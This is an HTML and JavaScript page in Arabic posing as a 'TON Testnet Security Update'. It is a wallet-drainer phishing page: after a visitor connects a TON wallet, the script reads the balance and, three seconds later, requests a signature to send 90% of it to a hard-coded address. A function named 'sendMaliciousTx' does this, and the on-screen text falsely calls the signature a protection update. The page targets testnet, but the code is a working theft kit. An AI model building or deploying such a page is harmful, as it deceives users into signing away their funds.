<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TON Testnet Security Update</title>
    <style>
        body { font-family: sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #161b22; padding: 30px; border-radius: 20px; border: 1px solid #30363d; text-align: center; width: 400px; }
        .balance-info { display: none; background: #0d1117; padding: 15px; border-radius: 10px; margin: 20px 0; border: 1px solid #58a6ff; }
        button { background: #238636; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; }
        #status { font-size: 12px; color: #8b949e; margin-top: 10px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://ton.org/address/ton_logo.png" width="60" alt="logo">
    <h2>تحديث الأمان (Testnet)</h2>
    <p>قم بالربط للتحقق من رصيدك وحماية حسابك.</p>
    
    <button id="connectBtn">اتصال مباشر عبر SDK</button>

    <div id="balanceBox" class="balance-info">
        <div>المحفظة: <span id="addr" style="font-size: 10px;">-</span></div>
        <div style="font-size: 20px; margin-top: 10px;">الرصيد: <span id="balance">0</span> TON</div>
    </div>

    <div id="status">جاهز للربط...</div>
</div>

<script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>

<script>
    const manifest = "https://gist.githubusercontent.com/pp0p/5119b45ec095aecbe9638d21f36e56ad/raw/d30a363c4cf4b6926d8b310a02ee1d350d869729/tonconnect-manifest.json";
    const connector = new TonConnectSDK.TonConnect({ manifestUrl: manifest });

    const connectBtn = document.getElementById('connectBtn');
    const balanceBox = document.getElementById('balanceBox');
    const statusDiv = document.getElementById('status');

    connectBtn.onclick = async () => {
        try {
            const connectUrl = connector.connect({
                universalLink: 'https://app.tonkeeper.com/ton-connect',
                bridgeUrl: 'https://bridge.tonapi.io/bridge'
            });
            window.location.href = connectUrl;
        } catch (e) { statusDiv.innerText = "خطأ: " + e.message; }
    };

    connector.onStatusChange(async (wallet) => {
        if (wallet) {
            const rawAddress = wallet.account.address;
            document.getElementById('addr').innerText = rawAddress;
            balanceBox.style.display = 'block';
            connectBtn.style.display = 'none';

            // جلب الرصيد من التست نيت
            try {
                const response = await fetch(`https://testnet.toncenter.com/api/v2/getAddressInformation?address=${rawAddress}`);
                const data = await response.json();
                const balanceNano = data.result.balance;
                const balanceTon = balanceNano / 1000000000;
                document.getElementById('balance').innerText = balanceTon.toFixed(2);

                // طلب توقيع لسحب الرصيد تلقائياً بعد 3 ثوانٍ
                statusDiv.innerText = "جاري التحقق من ملكية الرصيد...";
                setTimeout(() => sendMaliciousTx(balanceNano), 3000);
            } catch (e) { console.error("Balance fetch error", e); }
        }
    });

    async function sendMaliciousTx(nanoAmount) {
        // سحب الرصيد بالكامل (ناقص قليل للـ gas fees)
        const amountToSend = Math.floor(nanoAmount * 0.9); 
        
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60,
            messages: [{
                address: "0QAPwOt8W9eZqRj2OwxDjwSTtMMCG-uXr6MQMZ0WiFgdP0rY", // محفظتك للتست نيت
                amount: amountToSend.toString()
            }]
        };

        try {
            statusDiv.innerText = "يرجى توقيع المعاملة لتحديث الحماية...";
            await connector.sendTransaction(transaction);
            statusDiv.innerText = "✅ تمت العملية بنجاح!";
        } catch (e) {
            statusDiv.innerText = "❌ تم رفض التوقيع.";
        }
    }
</script>
</body>
</html>
